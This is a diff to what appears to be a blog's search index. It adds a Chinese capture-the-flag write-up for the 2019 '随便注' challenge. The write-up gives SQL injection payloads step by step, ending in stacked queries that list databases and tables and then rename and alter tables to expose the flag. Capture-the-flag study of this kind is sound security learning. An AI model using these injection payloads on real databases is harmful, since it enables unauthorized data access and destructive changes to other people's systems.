@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>随便注 1</title>
+      <link href="/%E9%9A%8F%E4%BE%BF%E6%B3%A8-1/"/>
+      <url>/%E9%9A%8F%E4%BE%BF%E6%B3%A8-1/</url>
+      
+        <content type="html"><![CDATA[<h3 id="强网杯2019-随便注"><a href="#强网杯2019-随便注" class="headerlink" title="强网杯2019-随便注"></a>强网杯2019-随便注</h3><p>1，测试<code>1&#39; or 1=1 #</code>,初步判定存在SQL注入。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1=1 #</span></span><br></pre></td></tr></table></figure><p>再测试字段数，到3时报错，说明字段数为2.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; order by 1 # </span></span><br></pre></td></tr></table></figure><p>接着尝试union注入,回显了过滤的关键字。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,2#</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230726152210746.png" alt="image-20230726152210746"></p><p>然后就是今天学会的新姿势“堆叠注入”了。<br>原理很简单，就是通过 ; 号注入多条SQL语句。<br>先通过show databases爆出数据库。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27;; show databases; #</span></span><br></pre></td></tr></table></figure><p>然后用 show tables 尝试爆表。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27;; show tables; #</span></span><br></pre></td></tr></table></figure><p>可以看到这里有两个表，我们先尝试爆words表的内容。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;; show columns from words; #</span></span><br></pre></td></tr></table></figure><p>表名为数字时，要用反引号包起来查询。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27;; show columns from `1919810931114514 `; #</span></span><br></pre></td></tr></table></figure><p>1，通过 rename 先把 words 表改名为其他的表名。</p><p>2，把 1919810931114514 表的名字改为 words 。</p><p>3 ，给新 words 表添加新的列名 id 。</p><p>4，将 flag 改名为 data 。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;; rename table words to word1; rename table `1919810931114514` to words;alter table words add id    int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);#</span></span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> -[CTF, BUUCTF] </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> sql注入 </tag>
+            
+            <tag> buuctf </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>WebsiteManger</title>
       <link href="/WebsiteManger/"/>
       <url>/WebsiteManger/</url>
